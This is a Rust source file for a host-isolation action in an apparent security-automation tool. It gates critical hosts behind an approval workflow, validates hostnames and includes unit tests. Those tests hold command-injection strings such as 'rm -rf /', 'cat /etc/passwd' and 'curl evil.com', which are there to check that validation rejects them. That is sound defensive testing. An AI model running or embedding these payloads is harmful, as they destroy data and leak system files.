//! Host isolation action.
//!
//! This action isolates a host from the network using the configured EDR connector.
//!
//! # Safety Features
//!
//! This action includes safeguards to prevent accidental isolation of critical infrastructure:
//! - Critical host patterns are checked before isolation
//! - Hosts matching critical patterns ALWAYS require manual approval workflow
//! - Only users with SystemAdmin permission can execute emergency overrides (via approval workflow)
//! - No parameter-based bypass is allowed - all critical host isolations must go through approval
//! - Default auto-rollback timeout of 4 hours
//!
//! # Security Note
//!
//! Critical host isolation cannot be bypassed via parameters. The approval workflow must be used
//! for all critical hosts. SystemAdmin users can approve emergency isolations through the
//! workflow, but cannot bypass the workflow entirely.

use crate::registry::{
    Action, ActionContext, ActionError, ActionResult, ParameterDef, ParameterType, Permission,
};
use async_trait::async_trait;
use chrono::Utc;
use regex::Regex;
use std::collections::HashMap;
use std::sync::Arc;
use tracing::{info, instrument, warn};
use tw_connectors::EDRConnector;
use tw_core::ValidatedHostname;

/// Default patterns for critical hosts that require manual approval before isolation.
/// These regex patterns match hostnames of critical infrastructure that should not be
/// automatically isolated without explicit human approval.
const DEFAULT_CRITICAL_HOST_PATTERNS: &[&str] = &[
    r"^prod-db-",    // Production databases
    r"^production-", // Production servers
    r"-master$",     // Master nodes
    r"^core-",       // Core infrastructure
    r"^dc-",         // Domain controllers
    r"-dc\d*$",      // Domain controllers (suffix)
    r"^ad-",         // Active Directory servers
    r"^dns-",        // DNS servers
    r"^dhcp-",       // DHCP servers
    r"^ca-",         // Certificate authority servers
    r"^backup-",     // Backup servers
    r"^san-",        // Storage area network
    r"^nas-",        // Network attached storage
    r"^vpn-",        // VPN gateways
    r"^fw-",         // Firewalls
    r"^lb-",         // Load balancers
];

/// Default auto-rollback timeout in hours.
const DEFAULT_ROLLBACK_TIMEOUT_HOURS: u64 = 4;

/// Action to isolate a host from the network.
pub struct IsolateHostAction {
    edr: Arc<dyn EDRConnector>,
    /// Regex patterns for critical hosts that require approval.
    critical_patterns: Vec<Regex>,
    /// Auto-rollback timeout in hours (0 to disable).
    rollback_timeout_hours: u64,
}

impl IsolateHostAction {
    /// Creates a new isolate host action with default critical host patterns.
    pub fn new(edr: Arc<dyn EDRConnector>) -> Self {
        Self::with_patterns(
            edr,
            DEFAULT_CRITICAL_HOST_PATTERNS,
            DEFAULT_ROLLBACK_TIMEOUT_HOURS,
        )
    }

    /// Creates a new isolate host action with custom critical host patterns.
    pub fn with_patterns(
        edr: Arc<dyn EDRConnector>,
        patterns: &[&str],
        rollback_timeout_hours: u64,
    ) -> Self {
        let critical_patterns = patterns
            .iter()
            .filter_map(|p| match Regex::new(p) {
                Ok(re) => Some(re),
                Err(e) => {
                    warn!("Invalid critical host pattern '{}': {}", p, e);
                    None
                }
            })
            .collect();

        Self {
            edr,
            critical_patterns,
            rollback_timeout_hours,
        }
    }

    /// Checks if a hostname matches any critical host pattern.
    fn is_critical_host(&self, hostname: &str) -> Option<&str> {
        let hostname_lower = hostname.to_lowercase();
        for (i, pattern) in self.critical_patterns.iter().enumerate() {
            if pattern.is_match(&hostname_lower) {
                // Return the original pattern string for the error message
                return Some(
                    DEFAULT_CRITICAL_HOST_PATTERNS
                        .get(i)
                        .unwrap_or(&"custom pattern"),
                );
            }
        }
        None
    }
}

#[async_trait]
impl Action for IsolateHostAction {
    fn name(&self) -> &str {
        "isolate_host"
    }

    fn description(&self) -> &str {
        "Isolates a host from the network using the EDR agent"
    }

    fn required_parameters(&self) -> Vec<ParameterDef> {
        vec![
            ParameterDef::required("hostname", "The hostname to isolate", ParameterType::String),
            ParameterDef::optional(
                "reason",
                "Reason for isolation",
                ParameterType::String,
                serde_json::json!("Automated isolation by Triage Warden"),
            ),
        ]
    }

    fn supports_rollback(&self) -> bool {
        true
    }

    #[instrument(skip(self, context))]
    async fn execute(&self, context: ActionContext) -> Result<ActionResult, ActionError> {
        let started_at = Utc::now();
        let hostname_raw = context.require_string("hostname")?;

        // Validate hostname using centralized validation (RFC 1035 + injection prevention)
        let validated_hostname = ValidatedHostname::new(&hostname_raw).map_err(|e| {
            warn!("Invalid hostname '{}': {}", hostname_raw, e);
            ActionError::InvalidParameters(format!("Invalid hostname: {}", e))
        })?;

        // Use the validated and normalized hostname from here on
        let hostname = validated_hostname.as_str();

        let reason = context
            .get_string("reason")
            .unwrap_or_else(|| "Automated isolation by Triage Warden".to_string());

        info!("Isolating host: {} (reason: {})", hostname, reason);

        // Check if this is a critical host that requires manual approval
        // Critical hosts ALWAYS require the approval workflow - no parameter-based bypass allowed
        if let Some(matched_pattern) = self.is_critical_host(hostname) {
            // Check if this action has been approved through the approval workflow
            if !context.is_approved() {
                warn!(
                    "Host '{}' matches critical pattern '{}' - manual approval required",
                    hostname, matched_pattern
                );

                // Provide guidance on how to proceed
                let approval_msg = if context.has_permission(Permission::SystemAdmin) {
                    "You have SystemAdmin permission. Please use the approval workflow to authorize this emergency isolation."
                } else {
                    "Please submit this action through the approval workflow for review by a SystemAdmin."
                };

                return Err(ActionError::RequiresApproval(format!(
                    "Host '{}' matches critical infrastructure pattern '{}'. \
                     This host cannot be automatically isolated without explicit approval. \
                     {}",
                    hostname, matched_pattern, approval_msg
                )));
            }

            // Verify the approval came from a SystemAdmin for critical hosts
            if !context.approval_has_permission(Permission::SystemAdmin) {
                warn!(
                    "Approval for critical host '{}' was not from a SystemAdmin",
                    hostname
                );
                return Err(ActionError::RequiresApproval(format!(
                    "Critical host '{}' isolation requires approval from a user with SystemAdmin permission.",
                    hostname
                )));
            }

            info!(
                "Executing approved emergency isolation of critical host '{}' (pattern: '{}')",
                hostname, matched_pattern
            );
        }

        // Get current host info to verify it exists and capture state for rollback
        let host_info = self
            .edr
            .get_host_info(hostname)
            .await
            .map_err(|e| ActionError::ConnectorError(e.to_string()))?;

        if host_info.isolated {
            return Ok(ActionResult::success(
                self.name(),
                &format!("Host {} is already isolated", hostname),
                started_at,
                HashMap::new(),
            ));
        }

        // Execute isolation
        let edr_result = self
            .edr
            .isolate_host(hostname)
            .await
            .map_err(|e| ActionError::ExecutionFailed(e.to_string()))?;

        if !edr_result.success {
            return Err(ActionError::ExecutionFailed(edr_result.message));
        }

        let mut output = HashMap::new();
        output.insert("hostname".to_string(), serde_json::json!(hostname));
        output.insert("host_id".to_string(), serde_json::json!(host_info.host_id));
        output.insert(
            "action_id".to_string(),
            serde_json::json!(edr_result.action_id),
        );
        if self.rollback_timeout_hours > 0 {
            output.insert(
                "auto_rollback_hours".to_string(),
                serde_json::json!(self.rollback_timeout_hours),
            );
            output.insert(
                "auto_rollback_at".to_string(),
                serde_json::json!((Utc::now()
                    + chrono::Duration::hours(self.rollback_timeout_hours as i64))
                .to_rfc3339()),
            );
        }

        let rollback_data = serde_json::json!({
            "hostname": hostname,
            "host_id": host_info.host_id,
        });

        info!(
            "Host {} isolated successfully (auto-rollback in {} hours)",
            hostname, self.rollback_timeout_hours
        );

        Ok(ActionResult::success(
            self.name(),
            &format!(
                "Host {} isolated successfully. Auto-rollback scheduled in {} hours.",
                hostname, self.rollback_timeout_hours
            ),
            started_at,
            output,
        )
        .with_rollback(rollback_data))
    }

    #[instrument(skip(self, rollback_data))]
    async fn rollback(
        &self,
        rollback_data: serde_json::Value,
    ) -> Result<ActionResult, ActionError> {
        let started_at = Utc::now();
        let hostname = rollback_data["hostname"].as_str().ok_or_else(|| {
            ActionError::InvalidParameters("Missing hostname in rollback data".to_string())
        })?;

        info!("Rolling back isolation for host: {}", hostname);

        let edr_result = self
            .edr
            .unisolate_host(hostname)
            .await
            .map_err(|e| ActionError::RollbackFailed(e.to_string()))?;

        if !edr_result.success {
            return Err(ActionError::RollbackFailed(edr_result.message));
        }

        let mut output = HashMap::new();
        output.insert("hostname".to_string(), serde_json::json!(hostname));
        output.insert(
            "action_id".to_string(),
            serde_json::json!(edr_result.action_id),
        );

        info!("Isolation rolled back for host: {}", hostname);

        Ok(ActionResult::success(
            "rollback_isolate_host",
            &format!("Isolation removed from host {}", hostname),
            started_at,
            output,
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tw_connectors::edr::MockEDRConnector;
    use uuid::Uuid;

    #[tokio::test]
    async fn test_isolate_host() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("workstation-001"))
            .with_param("reason", serde_json::json!("Malware detected"));

        let result = action.execute(context).await.unwrap();
        assert!(result.success);
        assert!(result.rollback_available);
        assert!(result.output.contains_key("auto_rollback_hours"));
    }

    #[tokio::test]
    async fn test_isolate_already_isolated() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));

        // First isolate
        edr.isolate_host("workstation-001").await.unwrap();

        let action = IsolateHostAction::new(edr);

        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("workstation-001"));

        let result = action.execute(context).await.unwrap();
        assert!(result.success);
        assert!(result.message.contains("already isolated"));
    }

    #[tokio::test]
    async fn test_rollback() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr.clone());

        // First isolate
        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("workstation-001"));

        let result = action.execute(context).await.unwrap();
        let rollback_data = result.rollback_data.unwrap();

        // Then rollback
        let rollback_result = action.rollback(rollback_data).await.unwrap();
        assert!(rollback_result.success);

        // Verify host is no longer isolated
        let host = edr.get_host_info("workstation-001").await.unwrap();
        assert!(!host.isolated);
    }

    #[tokio::test]
    async fn test_critical_host_requires_approval() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        // Try to isolate a production database server
        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("prod-db-primary"));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::RequiresApproval(_))));

        if let Err(ActionError::RequiresApproval(msg)) = result {
            assert!(msg.contains("prod-db-primary"));
            assert!(msg.contains("critical infrastructure"));
        }
    }

    #[tokio::test]
    async fn test_critical_host_domain_controller_suffix() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        // Domain controller with suffix pattern
        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("server-dc01"));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::RequiresApproval(_))));
    }

    #[tokio::test]
    async fn test_critical_host_requires_approval_even_with_permissions() {
        // Even users with SystemAdmin permission must go through approval workflow
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        // User has SystemAdmin permission but hasn't gone through approval
        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("prod-db-primary"))
            .with_permission(Permission::SystemAdmin);

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::RequiresApproval(_))));

        if let Err(ActionError::RequiresApproval(msg)) = result {
            assert!(msg.contains("approval workflow"));
        }
    }

    #[tokio::test]
    async fn test_critical_host_with_valid_sysadmin_approval() {
        use chrono::Utc;
        use tw_connectors::{HostInfo, HostStatus};

        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));

        // Add a critical host to the mock
        edr.add_host(HostInfo {
            hostname: "prod-db-primary".to_string(),
            host_id: "host-critical-1".to_string(),
            ip_addresses: vec!["10.0.0.100".to_string()],
            mac_addresses: vec!["00:11:22:33:44:66".to_string()],
            os: "Linux".to_string(),
            os_version: "Ubuntu 22.04".to_string(),
            agent_version: "6.42.0".to_string(),
            last_seen: Utc::now(),
            isolated: false,
            status: HostStatus::Online,
            tags: vec!["database".to_string(), "production".to_string()],
        })
        .await;

        let action = IsolateHostAction::new(edr);

        // Proper approval workflow: action is marked as approved by a SystemAdmin
        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("prod-db-primary"))
            .with_approval(Permission::SystemAdmin);

        let result = action.execute(context).await.unwrap();
        assert!(result.success);
    }

    #[tokio::test]
    async fn test_critical_host_approval_requires_sysadmin() {
        // Approval from non-SystemAdmin should be rejected for critical hosts
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        // Approved but not by a SystemAdmin (using default Operator permission)
        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("prod-db-primary"))
            .with_approval(Permission::Operator);

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::RequiresApproval(_))));

        if let Err(ActionError::RequiresApproval(msg)) = result {
            assert!(msg.contains("SystemAdmin permission"));
        }
    }

    #[tokio::test]
    async fn test_critical_host_always_requires_approval_no_bypass() {
        // This test verifies that there is NO way to bypass approval for critical hosts
        // via parameters - the force flag has been removed
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        // Attempt to pass a "force" parameter - it should be ignored
        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("prod-db-primary"))
            .with_param("force", serde_json::json!(true)); // This parameter is no longer recognized

        let result = action.execute(context).await;

        // Should still require approval - force parameter has no effect
        assert!(
            matches!(result, Err(ActionError::RequiresApproval(_))),
            "Critical host isolation should require approval regardless of any parameters"
        );
    }

    #[test]
    fn test_force_parameter_not_in_definitions() {
        // Verify that 'force' is not in the parameter definitions
        let edr = Arc::new(tw_connectors::edr::MockEDRConnector::with_sample_data(
            "test",
        ));
        let action = IsolateHostAction::new(edr);

        let params = action.required_parameters();
        let param_names: Vec<&str> = params.iter().map(|p| p.name.as_str()).collect();

        assert!(
            !param_names.contains(&"force"),
            "The 'force' parameter should not exist in action parameters"
        );
        assert!(
            param_names.contains(&"hostname"),
            "hostname parameter should exist"
        );
        assert!(
            param_names.contains(&"reason"),
            "reason parameter should exist"
        );
    }

    #[tokio::test]
    async fn test_non_critical_host_allowed() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        // Regular workstation should be allowed (workstation-001 exists in mock data)
        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("workstation-002"));

        let result = action.execute(context).await.unwrap();
        assert!(result.success);
    }

    #[tokio::test]
    async fn test_custom_patterns() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        // Custom patterns to protect only servers starting with "vip-"
        let action = IsolateHostAction::with_patterns(edr, &[r"^vip-"], 2);

        // VIP server should require approval
        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("vip-webserver"));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::RequiresApproval(_))));
    }

    #[test]
    fn test_is_critical_host() {
        let edr = Arc::new(tw_connectors::edr::MockEDRConnector::with_sample_data(
            "test",
        ));
        let action = IsolateHostAction::new(edr);

        // Should match
        assert!(action.is_critical_host("prod-db-primary").is_some());
        assert!(action.is_critical_host("production-web-01").is_some());
        assert!(action.is_critical_host("sql-master").is_some());
        assert!(action.is_critical_host("core-router").is_some());
        assert!(action.is_critical_host("dc-primary").is_some());
        assert!(action.is_critical_host("server-dc01").is_some());
        assert!(action.is_critical_host("dns-primary").is_some());

        // Should not match
        assert!(action.is_critical_host("workstation-001").is_none());
        assert!(action.is_critical_host("user-laptop").is_none());
        assert!(action.is_critical_host("dev-server").is_none());
    }

    // ========== Hostname Validation Tests ==========

    #[tokio::test]
    async fn test_hostname_validation_rejects_semicolon_injection() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("server; rm -rf /"));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));

        if let Err(ActionError::InvalidParameters(msg)) = result {
            assert!(msg.contains("Invalid hostname"));
        }
    }

    #[tokio::test]
    async fn test_hostname_validation_rejects_pipe_injection() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("server | cat /etc/passwd"));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
    }

    #[tokio::test]
    async fn test_hostname_validation_rejects_backtick_injection() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("`cat /etc/passwd`"));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
    }

    #[tokio::test]
    async fn test_hostname_validation_rejects_dollar_substitution() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("$(cat /etc/passwd)"));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
    }

    #[tokio::test]
    async fn test_hostname_validation_rejects_ampersand_injection() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("server && curl evil.com"));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
    }

    #[tokio::test]
    async fn test_hostname_validation_rejects_newline_injection() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("server\nrm -rf /"));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
    }

    #[tokio::test]
    async fn test_hostname_validation_rejects_empty_hostname() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        let context =
            ActionContext::new(Uuid::new_v4()).with_param("hostname", serde_json::json!(""));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
    }

    #[tokio::test]
    async fn test_hostname_validation_rejects_too_long_hostname() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        // 254 characters is too long (max is 253)
        let long_hostname = "a".repeat(254);
        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!(long_hostname));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
    }

    #[tokio::test]
    async fn test_hostname_validation_accepts_valid_fqdn() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("workstation-001.example.com"));

        // Should succeed (workstation is in mock data)
        let result = action.execute(context).await;
        assert!(result.is_ok() || matches!(result, Err(ActionError::ConnectorError(_))));
    }

    #[tokio::test]
    async fn test_hostname_validation_normalizes_to_lowercase() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        // Upper case should be normalized - workstation-001 exists in mock
        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("WORKSTATION-001"));

        let result = action.execute(context).await;
        // Should either succeed or fail for non-hostname reasons (connector)
        assert!(result.is_ok() || matches!(result, Err(ActionError::ConnectorError(_))));
    }

    #[tokio::test]
    async fn test_hostname_validation_rejects_label_starting_with_hyphen() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("-invalid-hostname"));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
    }

    #[tokio::test]
    async fn test_hostname_validation_rejects_consecutive_dots() {
        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
        let action = IsolateHostAction::new(edr);

        let context = ActionContext::new(Uuid::new_v4())
            .with_param("hostname", serde_json::json!("server..example.com"));

        let result = action.execute(context).await;
        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
    }
}
